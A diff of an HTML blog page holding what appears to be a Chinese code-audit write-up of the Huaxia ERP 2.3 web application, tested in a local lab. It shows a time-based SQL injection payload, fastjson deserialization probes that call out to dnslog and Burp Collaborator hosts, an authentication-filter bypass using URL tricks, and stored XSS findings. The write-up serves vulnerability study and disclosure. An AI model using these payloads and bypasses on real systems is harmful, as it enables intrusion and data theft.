@@ -357,49 +357,57 @@
                     
 
                     
-                         <h1 id="JAVA代码审计-华夏ERP"><a href="#JAVA代码审计-华夏ERP" class="headerlink" title="JAVA代码审计 华夏ERP"></a>JAVA代码审计 华夏ERP</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>早就写的一篇文章，只是因为处于迷茫期很多积攒的没有发。而且感觉搭在服务器上不如搭在github上，等这回服务器到期了就换个地方。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>审的是这个版本的<a class="link"   target="_blank" rel="noopener" href="https://github.com/jishenghua/jshERP/releases/tag/2.3" >华夏ERP2.3<i class="fas fa-external-link-alt"></i></a> 现在改名叫jsherp了，虽然版本老但是不妨碍成为学习审计代码的一个好例子</p>
+                         <h1 id="java代码审计-华夏erp"><a class="markdownIt-Anchor" href="#java代码审计-华夏erp"></a> JAVA代码审计 华夏ERP</h1>
+<h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2>
+<p>早就写的一篇文章，只是因为处于迷茫期很多积攒的没有发。而且感觉搭在服务器上不如搭在github上，等这回服务器到期了就换个地方。</p>
+<h2 id="环境搭建"><a class="markdownIt-Anchor" href="#环境搭建"></a> 环境搭建</h2>
+<p>审的是这个版本的<a class="link"   target="_blank" rel="noopener" href="https://github.com/jishenghua/jshERP/releases/tag/2.3" >华夏ERP2.3<i class="fas fa-external-link-alt"></i></a> 现在改名叫jsherp了，虽然版本老但是不妨碍成为学习审计代码的一个好例子</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20241229111847411.png"
-                        alt="image-20241229111847411"
+                        alt="image-20241229111847411" 
                  ></p>
 <p>将sql导入后，配置一下相关文件就可以了</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20241229112205160.png"
-                        alt="image-20241229112205160"
+                        alt="image-20241229112205160" 
                  ></p>
-<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="审计准备"><a href="#审计准备" class="headerlink" title="审计准备"></a>审计准备</h3><h4 id="看readme"><a href="#看readme" class="headerlink" title="看readme"></a>看readme</h4><p>能让自己对这个项目有个大概的了解，构造出一个前期审计代码的大致侧重点。</p>
+<h2 id="代码审计"><a class="markdownIt-Anchor" href="#代码审计"></a> 代码审计</h2>
+<h3 id="审计准备"><a class="markdownIt-Anchor" href="#审计准备"></a> 审计准备</h3>
+<h4 id="看readme"><a class="markdownIt-Anchor" href="#看readme"></a> 看readme</h4>
+<p>能让自己对这个项目有个大概的了解，构造出一个前期审计代码的大致侧重点。</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20241229115256964.png"
-                        alt="image-20241229115256964"
+                        alt="image-20241229115256964" 
                  ></p>
 <p>侧重点：审sql注入时就要注意$符号了，并且可能存在log4j漏洞</p>
-<h4 id="看pom"><a href="#看pom" class="headerlink" title="看pom"></a>看pom</h4><p><img  
+<h4 id="看pom"><a class="markdownIt-Anchor" href="#看pom"></a> 看pom</h4>
+<p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20241229115635170.png"
-                        alt="image-20241229115635170"
+                        alt="image-20241229115635170" 
                  ></p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250103215926828.png"
-                        alt="image-20250103215926828"
+                        alt="image-20250103215926828" 
                  ></p>
 <p>有可能存在fastjson的漏洞但是并没有引入log4j-core所以不存在log4j的漏洞</p>
-<h4 id="看filter"><a href="#看filter" class="headerlink" title="看filter"></a>看filter</h4><p>学习filter内存马的时候就了解过filter了</p>
+<h4 id="看filter"><a class="markdownIt-Anchor" href="#看filter"></a> 看filter</h4>
+<p>学习filter内存马的时候就了解过filter了</p>
 <p>直接到doFilter那里</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20241229121609814.png"
-                        alt="image-20241229121609814"
+                        alt="image-20241229121609814" 
                  ></p>
 <p>主要对四个内容处理</p>
 <p>是否登录</p>
@@ -409,44 +417,46 @@
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20241229122110059.png"
-                        alt="image-20241229122110059"
+                        alt="image-20241229122110059" 
                  ></p>
 <p>但是我们发现</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20241229122453224.png"
-                        alt="image-20241229122453224"
+                        alt="image-20241229122453224" 
                  ></p>
 <p>他对这个放行的页面处理似乎有些问题，用的是<code>startsWith()</code>对URL进行判断是否是白名单的那些，那么就可以通过目录穿越来未授权访问其他页面了，等会在测试的时候留意一下这里。</p>
-<h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>先去找我们刚才留下的疑惑点入手。</p>
-<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>因为用的是mybatis,所以直接在mapper里搜索<code>$</code></p>
+<h3 id="审计"><a class="markdownIt-Anchor" href="#审计"></a> 审计</h3>
+<p>先去找我们刚才留下的疑惑点入手。</p>
+<h4 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> sql注入</h4>
+<p>因为用的是mybatis,所以直接在mapper里搜索<code>$</code></p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102202943650.png"
-                        alt="image-20250102202943650"
+                        alt="image-20250102202943650" 
                  ></p>
 <p>发现很多都是用的$来编写的sql语句，所以我们可以换种思路，搜索容易出现sql注入的关键字比如’like’。</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102203045148.png"
-                        alt="image-20250102203045148"
+                        alt="image-20250102203045148" 
                  ></p>
 <p>找到对应的<code>MapperEx</code>文件（<code>MapperEx</code>文件一般用来封装复杂sql语句与主 <code>Mapper</code> 分离，避免 <code>Mapper</code> 变得臃肿）</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102203119236.png"
-                        alt="image-20250102203119236"
+                        alt="image-20250102203119236" 
                  ></p>
 <p>再找到对应的Service</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102203134694.png"
-                        alt="image-20250102203134694"
+                        alt="image-20250102203134694" 
                  ></p>
 <p>一直可以往上找一般我的思路就是mapper-&gt;service-&gt;controll</p>
 <p>发现最后到了<code>ResourceController</code>不应该是<code>RoleController</code>么，接下来就是黑白盒结合去探究了（其实这里如果是开发经验够足的化肯定就懂了，后面查阅一下ResourceController的作用）</p>
@@ -454,52 +464,51 @@
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102203310849.png"
-                        alt="image-20250102203310849"
+                        alt="image-20250102203310849" 
                  ></p>
 <p>在<code>RoleService</code>这里打断点调试</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102203830189.png"
-                        alt="image-20250102203830189"
+                        alt="image-20250102203830189" 
                  ></p>
 <p>很明显后台有个角色管理这会走到这里</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102203901361.png"
-                        alt="image-20250102203901361"
+                        alt="image-20250102203901361" 
                  ></p>
 <p>隐约就可以才到那个角色名称应该就是name参数了，抓个包看看</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102204146758.png"
-                        alt="image-20250102204146758"
+                        alt="image-20250102204146758" 
                  ></p>
 <p>看后台断点</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102204232056.png"
-                        alt="image-20250102204232056"
+                        alt="image-20250102204232056" 
                  ></p>
 <p>可以看到确实如我们推断</p>
 <p>尝试进行语句拼接</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;aaa&#x27; or sleep(3)-- =&quot;&#125;</span><br></pre></td></tr></table></figure>
-
 <p>url编码一下</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102204812022.png"
-                        alt="image-20250102204812022"
+                        alt="image-20250102204812022" 
                  ></p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102204835144.png"
-                        alt="image-20250102204835144"
+                        alt="image-20250102204835144" 
                  ></p>
 <p>发现执行成功</p>
 <p>后台也能看到记录</p>
@@ -507,7 +516,7 @@
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250102205251592.png"
-                        alt="image-20250102205251592"
+                        alt="image-20250102205251592" 
                  ></p>
 <p>查倒是不好查，直接by GPT了</p>
 <blockquote>
@@ -520,28 +529,30 @@
 </ol>
 </blockquote>
 <p>简显易懂，那其实很多语句只要参数可控都可以类似这个流程sql注入了，像like基本就是搜索功能了，其他的内容有兴趣可以自行探索。</p>
-<h4 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h4><p>刚才我们在看pom的时候发现用的fastjson版本是存在漏洞的，现在全局搜索以parseObject</p>
+<h4 id="fastjson"><a class="markdownIt-Anchor" href="#fastjson"></a> fastjson</h4>
+<p>刚才我们在看pom的时候发现用的fastjson版本是存在漏洞的，现在全局搜索以parseObject</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104202200594.png"
-                        alt="image-20250104202200594"
+                        alt="image-20250104202200594" 
                  ></p>
 <p>先找这种没有限定类的，然后去测试参数是否可控</p>
 <p>有兴趣的师傅可以多去尝试几个，有练习意义</p>
-<h5 id="半场开香槟版"><a href="#半场开香槟版" class="headerlink" title="半场开香槟版"></a>半场开香槟版</h5><p>这里就写一下其中一个测试的</p>
+<h5 id="半场开香槟版"><a class="markdownIt-Anchor" href="#半场开香槟版"></a> 半场开香槟版</h5>
+<p>这里就写一下其中一个测试的</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104203048486.png"
-                        alt="image-20250104203048486"
+                        alt="image-20250104203048486" 
                  ></p>
 <p>跟踪一下这个</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104203222112.png"
-                        alt="image-20250104203222112"
+                        alt="image-20250104203222112" 
                  ></p>
 <p>推测应该是商品的添加功能，也可以去数据库看看数据，我的方法是这样定位的</p>
 <p>这里</p>
@@ -549,45 +560,44 @@
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104204450949.png"
-                        alt="image-20250104204450949"
+                        alt="image-20250104204450949" 
                  ></p>
 <p>添加到forward到这个包</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104204545269.png"
-                        alt="image-20250104204545269"
+                        alt="image-20250104204545269" 
                  ></p>
 <p>看到了javabean的数据</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104205705590.png"
-                        alt="image-20250104205705590"
+                        alt="image-20250104205705590" 
                  ></p>
 <p>看到这里的时候都要半场开香槟了</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104205907045.png"
-                        alt="image-20250104205907045"
+                        alt="image-20250104205907045" 
                  ></p>
-<p>构成payload看看检测一下先,放一下很多<a class="link"   target="_blank" rel="noopener" href="https://github.com/Nbccccc/Fastjson-Payload" >Nbccccc&#x2F;Fastjson-Payload: Fastjson姿势技巧集合<i class="fas fa-external-link-alt"></i></a>fork这位师傅的<a class="link"   target="_blank" rel="noopener" href="https://github.com/safe6Sec/Fastjson" >safe6Sec&#x2F;Fastjson: Fastjson姿势技巧集合<i class="fas fa-external-link-alt"></i></a></p>
+<p>构成payload看看检测一下先,放一下很多<a class="link"   target="_blank" rel="noopener" href="https://github.com/Nbccccc/Fastjson-Payload" >Nbccccc/Fastjson-Payload: Fastjson姿势技巧集合<i class="fas fa-external-link-alt"></i></a>fork这位师傅的<a class="link"   target="_blank" rel="noopener" href="https://github.com/safe6Sec/Fastjson" >safe6Sec/Fastjson: Fastjson姿势技巧集合<i class="fas fa-external-link-alt"></i></a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http://n9z7x6.dnslog.cn&quot;&#125;&#125;&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
 <p>但是并没有发生期待的结果，显示很骨感</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104210717930.png"
-                        alt="image-20250104210717930"
+                        alt="image-20250104210717930" 
                  ></p>
 <p>发现上面还有个<code>JSONObject.parseObject(beanJson, Material.class)</code></p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104210845064.png"
-                        alt="image-20250104210845064"
+                        alt="image-20250104210845064" 
                  ></p>
 <p>当然是加载不了的腻，看了眼Material也没有什么能用的getter、setter方法所以就寄掉了，最开始没注意上面，被上面截胡了。删到那一行就可以了，当然不可能开发出来让你打的oopz。</p>
 <p>但是有一说一试了一下这里fastjson版本要是低一点就可以打了，有兴趣的师傅可以试一下</p>
@@ -595,63 +605,66 @@
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250105220636152.png"
-                        alt="image-20250105220636152"
+                        alt="image-20250105220636152" 
                  ></p>
 <p>言知之易，行之难 多找找没准就又发现什么了呢xixi</p>
-<h5 id="成功版"><a href="#成功版" class="headerlink" title="成功版"></a>成功版</h5><p>找到JSONObject.parseObject(search)</p>
+<h5 id="成功版"><a class="markdownIt-Anchor" href="#成功版"></a> 成功版</h5>
+<p>找到JSONObject.parseObject(search)</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104214359109.png"
-                        alt="image-20250104214359109"
+                        alt="image-20250104214359109" 
                  ></p>
 <p>看到就直接恍然大悟，这个erp也调试到这里了，search这个参数经常在包里见到，直接白盒结合黑盒，去前面随便搜索一下到这个search参数。</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104214703205.png"
-                        alt="image-20250104214703205"
+                        alt="image-20250104214703205" 
                  ></p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104214721214.png"
-                        alt="image-20250104214721214"
+                        alt="image-20250104214721214" 
                  ></p>
 <p>直接上payload</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;http://h1jqa9iuj1mc266l0hei9kfnye45su.burpcollaborator.net&quot;&#125;&#125;&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250104215525842.png"
-                        alt="image-20250104215525842"
+                        alt="image-20250104215525842" 
                  ></p>
 <p>成功</p>
 <p>想要rce需要开启一下<code>autoTypeSupport</code>(<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>)，或者<code>Feature.SupportNonPublicField</code>参数等</p>
-<h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><p>这里就算filter里对访问目录控制的部分了，分为ignoredUrls，allowUrls</p>
-<h5 id="ignoredUrls"><a href="#ignoredUrls" class="headerlink" title="ignoredUrls"></a>ignoredUrls</h5><p>首先经过的ignoredUrls的处理，这里自定义一个<code>verify</code>函数来处理</p>
+<h4 id="未授权访问"><a class="markdownIt-Anchor" href="#未授权访问"></a> 未授权访问</h4>
+<p>这里就算filter里对访问目录控制的部分了，分为ignoredUrls，allowUrls</p>
+<h5 id="ignoredurls"><a class="markdownIt-Anchor" href="#ignoredurls"></a> ignoredUrls</h5>
+<p>首先经过的ignoredUrls的处理，这里自定义一个<code>verify</code>函数来处理</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220170651734.png"
-                        alt="image-20250220170651734"
+                        alt="image-20250220170651734" 
                  ></p>
 <p>会将读取的url拼接匹配符例如<code>^.*regex.*$</code>只要存在regex就返回true</p>
 <p>那很明显我们只要让读取的url里存在ignoredLists里的内容，并且访问的是我们指定的url就行了</p>
-<p>那如何构造呢，这里我想到了有时候可以看到访问的url为xxx.com&#x2F;xxx;jsession&#x3D;xxx</p>
+<p>那如何构造呢，<a class="link"   target="_blank" rel="noopener" href="http://xn--urlxxx-yy7i8tx0a81gd2hda329cy66ctrd4putjejo2gidcvw1ox8raxzjv2x.com/xxx;jsession=xxx" >这里我想到了有时候可以看到访问的url为xxx.com/xxx;jsession=xxx<i class="fas fa-external-link-alt"></i></a></p>
 <p>;后面会被容器处理掉的</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220171408588.png"
-                        alt="image-20250220171408588"
+                        alt="image-20250220171408588" 
                  ></p>
-<h5 id="allowUrls"><a href="#allowUrls" class="headerlink" title="allowUrls"></a>allowUrls</h5><p><img  
+<h5 id="allowurls"><a class="markdownIt-Anchor" href="#allowurls"></a> allowUrls</h5>
+<p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220171527036.png"
-                        alt="image-20250220171527036"
+                        alt="image-20250220171527036" 
                  ></p>
 <p>这里则是以allowUrls开头就允许访问</p>
 <p>把获取的url打印出来是这样的</p>
@@ -659,48 +672,51 @@
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220171440081.png"
-                        alt="image-20250220171440081"
+                        alt="image-20250220171440081" 
                  ></p>
 <p>那我们就可以这样了</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220171643455.png"
-                        alt="image-20250220171643455"
+                        alt="image-20250220171643455" 
                  ></p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220171652148.png"
-                        alt="image-20250220171652148"
+                        alt="image-20250220171652148" 
                  ></p>
-<h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><p>因为filter里并没有对XSS做什么特殊处理，所以有很多页面存下来的内容都成了存储型XSS</p>
+<h4 id="xss"><a class="markdownIt-Anchor" href="#xss"></a> XSS</h4>
+<p>因为filter里并没有对XSS做什么特殊处理，所以有很多页面存下来的内容都成了存储型XSS</p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220172433781.png"
-                        alt="image-20250220172433781"
+                        alt="image-20250220172433781" 
                  ></p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220172907123.png"
-                        alt="image-20250220172907123"
+                        alt="image-20250220172907123" 
                  ></p>
 <p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220173138727.png"
-                        alt="image-20250220173138727"
+                        alt="image-20250220173138727" 
                  ></p>
-<h4 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h4><p><img  
+<h4 id="log4j2"><a class="markdownIt-Anchor" href="#log4j2"></a> log4j2</h4>
+<p><img  
                        lazyload
                        alt="image"
                        data-src="https://nbcimage.oss-cn-nanjing.aliyuncs.com/Typora/image-20250220173548765.png"
-                        alt="image-20250220173548765"
+                        alt="image-20250220173548765" 
                  ></p>
 <p>没找到</p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://drun1baby.top/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/" >https://drun1baby.top/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2>
+<p><a class="link"   target="_blank" rel="noopener" href="https://drun1baby.top/2022/09/30/Java-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%8D%8E%E5%A4%8F-ERP-CMS-V2.3/" >https://drun1baby.top/2022/09/30/Java-代码审计之华夏-ERP-CMS-V2.3/<i class="fas fa-external-link-alt"></i></a></p>
 
                     
                 </div>
@@ -858,7 +874,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%8D%8E%E5%A4%8FERP"><span class="nav-text">JAVA代码审计 华夏ERP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1%E5%87%86%E5%A4%87"><span class="nav-text">审计准备</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8Breadme"><span class="nav-text">看readme</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8Bpom"><span class="nav-text">看pom</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8Bfilter"><span class="nav-text">看filter</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1"><span class="nav-text">审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastjson"><span class="nav-text">fastjson</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8D%8A%E5%9C%BA%E5%BC%80%E9%A6%99%E6%A7%9F%E7%89%88"><span class="nav-text">半场开香槟版</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%88%90%E5%8A%9F%E7%89%88"><span class="nav-text">成功版</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-text">未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ignoredUrls"><span class="nav-text">ignoredUrls</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#allowUrls"><span class="nav-text">allowUrls</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#XSS"><span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#log4j2"><span class="nav-text">log4j2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%8D%8E%E5%A4%8Ferp"><span class="nav-text"> JAVA代码审计 华夏ERP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text"> 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text"> 环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text"> 代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1%E5%87%86%E5%A4%87"><span class="nav-text"> 审计准备</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8Breadme"><span class="nav-text"> 看readme</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8Bpom"><span class="nav-text"> 看pom</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8Bfilter"><span class="nav-text"> 看filter</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1"><span class="nav-text"> 审计</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-text"> sql注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastjson"><span class="nav-text"> fastjson</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8D%8A%E5%9C%BA%E5%BC%80%E9%A6%99%E6%A7%9F%E7%89%88"><span class="nav-text"> 半场开香槟版</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%88%90%E5%8A%9F%E7%89%88"><span class="nav-text"> 成功版</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-text"> 未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#ignoredurls"><span class="nav-text"> ignoredUrls</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#allowurls"><span class="nav-text"> allowUrls</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xss"><span class="nav-text"> XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#log4j2"><span class="nav-text"> log4j2</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text"> 参考资料</span></a></li></ol></li></ol>
     </div>
 </div>
 
@@ -1036,7 +1052,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#JAVA%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E5%8D%8E%E5%A4%8FERP"><span class="nav-text">JAVA代码审计 华夏ERP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="nav-text">代码审计</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%A1%E8%AE%A1%E5%87%86%E5%A4%87"><span class="nav-text">审计准备</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8Breadme"><span class="nav-text">看readme</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9C%8Bpom"><span class="nav-text">看pom</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" 